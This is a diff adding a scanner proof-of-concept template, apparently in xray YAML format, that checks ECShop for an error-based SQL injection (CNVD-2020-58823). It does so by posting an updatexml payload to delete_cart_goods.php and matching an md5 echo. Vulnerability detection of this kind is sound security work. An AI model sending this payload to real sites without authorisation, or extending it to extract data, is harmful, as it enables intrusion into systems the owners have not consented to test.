@@ -1,0 +1,13 @@
+name: poc-yaml-ecshop-cnvd-2020-58823-sqli
+set:
+  r1: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /delete_cart_goods.php
+    body: id=0||(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+detail:
+  author: 凉风(http://webkiller.cn/)
+  links:
+    - https://mp.weixin.qq.com/s/1t0uglZNoZERMQpXVVjIPw
